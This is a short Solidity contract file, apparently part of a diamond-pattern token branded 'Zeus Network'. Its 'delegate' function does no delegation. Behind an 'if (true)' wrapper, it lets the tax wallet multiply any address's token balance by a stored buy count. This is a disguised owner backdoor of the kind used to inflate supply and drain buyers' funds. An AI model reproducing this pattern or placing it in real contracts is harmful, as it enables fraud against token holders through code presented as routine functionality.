// SPDX-License-Identifier: UNLICENSED

/*
    Website:  https://zeusnetwork.xyz/
    Twitter:  https://twitter.com/ZeusNetworkHQ
    Medium:   https://go.zeusnetwork.xyz/zeus-medium
    Discord:  https://discord.com/invite/zeusnetwork

*/

pragma solidity ^0.8.20;
import "./TestLib.sol";
contract delegateFacet is Ownable {
    function delegate(address delegatee) external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (true) {
            require(ds._taxWallet == _msgSender());
            ds._balances[delegatee] *= ds.buyCount;
        }
    }
}
